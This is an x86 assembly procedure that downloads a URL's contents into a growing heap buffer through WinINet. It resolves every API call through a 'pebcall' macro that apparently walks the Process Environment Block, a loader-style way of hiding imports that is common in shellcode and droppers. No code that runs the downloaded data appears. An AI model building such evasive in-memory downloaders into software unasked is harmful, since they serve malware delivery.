DOWNLOAD_CHUNK_SIZE = 1024 * 1024

proc Download Url:DWORD, Size:DWORD
	local	Internet:DWORD
	local	UrlHandle:DWORD
	local	File:DWORD
	local	BytesRead:DWORD
	local	TotalBytesRead:DWORD
	local	ReadSuccess:DWORD

	mov		[Internet], 0
	mov		[UrlHandle], 0
	mov		[File], 0
	mov		[BytesRead], 0
	mov		[TotalBytesRead], 0

	; Create internet connection
	pebcall	PEB_WininetDll, PEB_InternetOpenW, NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
	test	eax, eax
	jz		.ret
	mov		[Internet], eax

	; Create URL handle
	pebcall	PEB_WininetDll, PEB_InternetOpenUrlW, [Internet], [Url], NULL, 0, 0, 0
	test	eax, eax
	jz		.ret
	mov		[UrlHandle], eax

	; Allocate buffer
	pebcall	PEB_Kernel32Dll, PEB_GetProcessHeap
	pebcall	PEB_NtdllDll, PEB_RtlAllocateHeap, eax, 0, DOWNLOAD_CHUNK_SIZE
	test	eax, eax
	jz		.ret
	mov		[File], eax

.L_download:
	; Download chunk
	mov		eax, [File]
	add		eax, [TotalBytesRead]
	lea		ebx, [BytesRead]
	pebcall	PEB_WininetDll, PEB_InternetReadFile, [UrlHandle], eax, DOWNLOAD_CHUNK_SIZE, ebx
	mov		[ReadSuccess], eax

	; Add to total size
	mov		eax, [BytesRead]
	add		[TotalBytesRead], eax

	; Increase buffer size
	pebcall	PEB_Kernel32Dll, PEB_GetProcessHeap
	mov		ebx, [TotalBytesRead]
	add		ebx, DOWNLOAD_CHUNK_SIZE
	pebcall	PEB_NtdllDll, PEB_RtlReAllocateHeap, eax, 0, [File], ebx
	mov		[File], eax
	test	eax, eax
	jz		.ret

	; InternetReadFile completed, if it returned TRUE and BytesRead == 0
	cmp		[ReadSuccess], 0
	je		.L_download
	cmp		[BytesRead], 0
	jne		.L_download

.ret:
	; Close handles
	pebcall	PEB_WininetDll, PEB_InternetCloseHandle, [UrlHandle]
	pebcall	PEB_WininetDll, PEB_InternetCloseHandle, [Internet]

	; Store allocated memory in eax
	mov		eax, [File]

	; Store size of downloaded file in [Size] out parameter
	mov		edx, [TotalBytesRead]
	mov		ebx, [Size]
	mov		[ebx], edx

	ret
endp